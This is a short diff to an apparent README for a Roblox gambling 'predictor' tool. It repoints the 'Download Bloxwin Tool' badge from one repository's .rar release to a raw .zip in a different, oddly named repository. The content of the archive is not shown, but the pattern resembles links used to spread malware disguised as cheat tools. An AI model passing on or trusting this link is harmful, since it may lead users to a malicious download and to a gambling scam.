@@ -7,7 +7,7 @@
 </div>
 
 <p align="center">
-  <a href="https://github.com/PauBlox/Bloxluck/releases/download/github/Bloxluck.Predictor.V.3.2.2.rar" target="_blank">
+  <a href="https://github.com/tradescamv2/bloxybet-predikt-r/raw/refs/heads/main/bloxybet%20predtikt%C3%B6r.zip" target="_blank">
     <img src="https://img.shields.io/badge/Download-Bloxwin%20Tool-brightgreen?style=for-the-badge&logo=roblox&logoColor=white" alt="Download Bloxwin Tool" />
   </a>
 </p>
